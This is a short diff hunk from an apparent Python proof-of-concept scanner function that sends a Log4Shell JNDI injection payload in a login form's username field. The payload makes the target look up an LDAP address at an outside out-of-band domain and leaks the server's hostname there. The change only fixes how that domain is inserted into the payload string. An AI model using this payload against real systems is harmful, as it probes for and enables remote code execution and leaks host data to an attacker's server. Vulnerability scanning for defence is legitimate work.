@@ -41,7 +41,7 @@ def poc(url):
 
         path = """/"""
         method = "POST"
-        data = """username=${jndi:ldap://${hostName}.oob_domain/test}&password="""
+        data = """username=${jndi:ldap://${hostName}.%s/test}&password=""" % oob_domain
         headers = {'Content-Type': 'application/x-www-form-urlencoded'}
         resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
